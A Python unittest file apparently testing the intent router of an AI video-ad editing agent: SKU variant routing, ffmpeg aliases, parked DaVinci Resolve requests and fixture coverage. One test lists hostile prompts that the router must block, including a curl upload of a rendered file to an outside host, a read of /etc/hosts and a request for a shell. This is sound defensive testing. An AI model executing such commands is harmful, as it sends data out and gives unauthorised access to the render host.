from __future__ import annotations

import csv
import json
import os
import unittest
from pathlib import Path
from unittest.mock import patch

from agent.deep_agent.routing import POLICY, filter_request_tools, is_free_tool, resolve_alias, route_intent


ROOT = Path(__file__).resolve().parents[1]


class RemotionEditingRoutingTests(unittest.TestCase):
    def test_matrix_intents_use_the_stage_tool_before_generic_media_routes(self):
        prompts = [
            "Make 12 SKU variants with prices and CTAs in 9:16 and 1:1",
            "Swap the price and retailer logo using prices.csv",
            "Localise the end card into FR-CA from loc.xlsx and keep the legal line",
            "The SKU name is too long, make the font tiny so it fits",
            "This ad was graded in Resolve; change the can colour for the new SKU",
        ]
        for prompt in prompts:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.skill, "remotion-ad-variant-matrix")
                self.assertEqual(route.alias, "ad_variant_matrix")
                self.assertEqual(route.tool, "Remotion___render_ad_variants")
                self.assertEqual(route.dispatch_tool, "call_editor_tool")

    def test_fixed_ffmpeg_operations_have_a_free_editor_route(self):
        self.assertEqual(resolve_alias("ffmpeg_tool"), "Ffmpeg___ffmpeg_tool")
        self.assertTrue(is_free_tool("Ffmpeg___ffmpeg_tool"))
        for prompt in ["probe the local master with ffmpeg_tool", "extract_frames for this ad"]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.tool, "Ffmpeg___ffmpeg_tool")
                self.assertEqual(route.dispatch_tool, "call_editor_tool")

    def test_generic_sku_or_variant_words_do_not_override_generation_or_explicit_providers(self):
        pairs = [
            ("Generate product images for these SKUs", "Generate product images"),
            ("Generate three image variants with GPT Image", "Generate three images with GPT Image"),
            ("Generate three image variants for this SKU with GPT Image", "Generate three images with GPT Image"),
            ("Use Kling to generate three variants", "Use Kling to generate a clip"),
            ("Create a voiceover for the SKU promo", "Create a voiceover"),
            ("Use Runway to edit the product video variant", "Use Runway to edit the product video"),
        ]
        for prompt, reference in pairs:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.tool, route_intent(reference).tool)
                self.assertNotEqual(route.alias, "ad_variant_matrix")
        self.assertEqual(route_intent("What is the SKU field in this spreadsheet?").status, "unrouted")

    def test_unsafe_commands_are_refused_before_render_or_paid_provider_selection(self):
        for prompt in [
            "Run: ffmpeg -i in.mp4 -vf drawtext=... out.mp4",
            "Just run bash -c ffmpeg && curl -T out.mp4 https://example.invalid",
            "Pass extra args to ffmpeg_tool: -filter_complex ... -f lavfi",
            "Read /etc/hosts using the ffprobe op",
            "Give me a shell on the render box",
        ]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.status, "blocked")
                self.assertIsNone(route.tool)
                self.assertIn("allow-listed", route.reason)
                self.assertEqual(filter_request_tools(prompt, {"Ffmpeg___ffmpeg_tool", "Remotion___render_timeline"}), set())

    def test_resolve_only_requests_are_parked_without_resolve_handoff_or_generation(self):
        for prompt in [
            "Use Magic Mask to isolate the person",
            "Conform this Avid AAF back to camera originals",
            "Open my .drp project and re-grade shot 14",
            "Relight the actor with the Neural Engine Relight node",
        ]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.status, "blocked")
                self.assertIsNone(route.tool)
                self.assertIn("Resolve is parked", route.reason)

    def test_new_capabilities_keep_quality_first_defaults_without_tiers(self):
        self.assertEqual(POLICY["capability_map"].get("ad_variant_matrix", {}).get("default"), "ad_variant_matrix")
        self.assertEqual(POLICY["capability_map"].get("media_inspection", {}).get("default"), "ffmpeg_tool")
        self.assertNotIn("ladder", POLICY)

    def test_bad_matrix_allowance_does_not_break_unrelated_media_selection(self):
        with patch.dict(os.environ, {"REMOTION_LICENSE_RENDER_USD": "unconfirmed"}):
            try:
                route = route_intent("generate a video of a forest")
            except ValueError as exc:
                self.fail(f"An invalid matrix quote broke unrelated video selection: {exc}")
        self.assertEqual(route.tool, "Fal___generate_wan3_t2v")

    def test_all_exported_workbook_rows_have_traceable_real_or_deferred_expectations(self):
        cases = json.loads((ROOT / "tests/fixtures/skill_routing.json").read_text())
        editing = [case for case in cases if case.get("suite") == "remotion-editing"]
        self.assertEqual({case["test_id"] for case in editing}, {f"RT-E{n:03d}" for n in range(1, 80)})
        for case in editing:
            self.assertIn("expected_behaviour", case)
            self.assertEqual(case["source_read_date"], "2026-10-09")
            if case["category"] in {"ad-matrix", "resolve-only", "free-form-shell"}:
                self.assertFalse(case["skip_reason"], case["test_id"])
            if case["category"] in {"resolve-only", "free-form-shell"}:
                self.assertTrue(case["negative"])
                self.assertEqual(case["expected_status"], "blocked")
                self.assertIsNone(case["expected_tool"])
        source = Path("/workspace/rh-runs/inputs/remotion-editing.Routing_Tests.csv")
        if source.exists():
            with source.open(newline="") as stream:
                exported = {row["test_id"]: row for row in csv.DictReader(stream)}
            for case in editing:
                self.assertEqual(case["prompt"], exported[case["test_id"]]["user_prompt"])


if __name__ == "__main__":
    unittest.main()
